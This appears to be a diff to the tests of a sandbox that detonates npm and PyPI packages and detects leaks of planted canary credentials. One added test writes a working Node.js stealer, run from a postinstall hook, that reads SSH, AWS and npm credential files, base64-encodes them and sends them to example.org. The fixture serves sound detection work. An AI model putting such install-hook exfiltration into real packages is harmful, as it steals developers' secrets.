@@ -63,6 +63,8 @@ def test_pip_install_of_a_malicious_sdist_runs_in_the_sandbox_and_is_caught(tmp_
     signals = detonate_pypi_package("evilpkg", "1.0", tmp_path, "", summary=summary)
 
     assert "AWS_SECRET_ACCESS_KEY" in summary["canaries_leaked"]
+    # pip itself must never trip a honeyfile, or every package would be flagged
+    assert not [c for c in summary["canaries_leaked"] if c.startswith("~/")]
     assert any(s.category == "canary-exfiltration" for s in signals)
     assert list(summary["scripts_run"]) == ["pip install", "import"]
     assert summary["exit_code"] == 0 and "evilpkg" in summary["stdout_tail"]
@@ -96,3 +98,23 @@ def test_files_made_by_a_different_uid_can_still_be_cleaned_up(tmp_path):
     runner._reclaim_scratch(scratch, runner.CONTAINER_IMAGE)
     shutil.rmtree(scratch)
     assert not scratch.exists()
+
+
+def test_stolen_credential_files_are_recognised_by_their_contents(tmp_path):
+    """The sandbox home holds fake ~/.ssh/id_rsa, ~/.aws/credentials and ~/.npmrc. A package
+    that reads them and ships them out (even base64-encoded) is caught by the contents alone."""
+    (tmp_path / "steal.js").write_text(
+        "const fs = require('fs'), os = require('os'), https = require('https');\n"
+        "const read = (p) => { try { return fs.readFileSync(os.homedir() + p, 'utf8'); } catch (e) { return ''; } };\n"
+        "const blob = Buffer.from(read('/.ssh/id_rsa') + read('/.aws/credentials') + read('/.npmrc')).toString('base64');\n"
+        "https.get('https://example.org/?d=' + encodeURIComponent(blob)).on('error', () => {});\n"
+        "setTimeout(() => process.exit(0), 2500);\n"
+    )
+    pj = {"name": "y", "version": "1.0.0", "scripts": {"postinstall": "node steal.js"}}
+    (tmp_path / "package.json").write_text(json.dumps(pj))
+    summary: dict = {}
+    signals = detonate_package("y", "1.0.0", tmp_path, pj, summary=summary)
+
+    assert {"~/.ssh/id_rsa", "~/.aws/credentials", "~/.npmrc"} <= set(summary["canaries_leaked"])
+    assert "~/.pypirc" in summary["canaries_planted"] and "~/.pypirc" not in summary["canaries_leaked"]
+    assert any(s.category == "canary-exfiltration" for s in signals)
